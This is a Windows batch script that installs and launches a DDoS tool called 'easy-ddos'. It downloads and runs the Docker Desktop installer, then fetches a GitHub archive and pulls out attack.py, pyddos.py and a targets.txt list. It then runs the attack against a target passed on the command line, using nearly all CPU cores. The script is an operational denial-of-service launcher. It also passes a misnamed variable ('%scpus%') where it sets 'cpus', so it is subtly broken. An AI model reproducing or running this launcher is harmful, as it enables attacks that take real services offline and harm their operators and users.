@set "REPO_NAME=easy-ddos"
@set "ACTUAL_TAG=master"

@curl -L "https://desktop.docker.com/win/main/amd64/Docker Desktop Installer.exe" -o dockerinstaller.exe
@dockerinstaller.exe

@set "URL=http://github.com/julfy/%REPO_NAME%/archive/refs/heads/%ACTUAL_TAG%.zip"
:: from tag: @set "URL=http://github.com/julfy/%REPO_NAME%/archive/refs/tags/%ACTUAL_TAG%.zip"

:: Download or update
@curl -L %URL% -o "%ACTUAL_TAG%.zip"
@powershell -NoP -NonI -Command "Expand-Archive %ACTUAL_TAG%.zip %REPO_NAME%"
@move %REPO_NAME%\%REPO_NAME%-%ACTUAL_TAG%\pyddos.py .
@move %REPO_NAME%\%REPO_NAME%-%ACTUAL_TAG%\attack.py .
@move %REPO_NAME%\%REPO_NAME%-%ACTUAL_TAG%\targets.txt .

:: Cleanup
del /s /f /q  %REPO_NAME%\*.*
for /f %%f in ('dir /ad /b  %REPO_NAME%') do rd /s /q  %REPO_NAME%\%%f

:: Start
:: use <total CPU cores> - 1
set /a cpus = %NUMBER_OF_PROCESSORS% - 1
python3 attack.py -s "%1" -n %scpus%
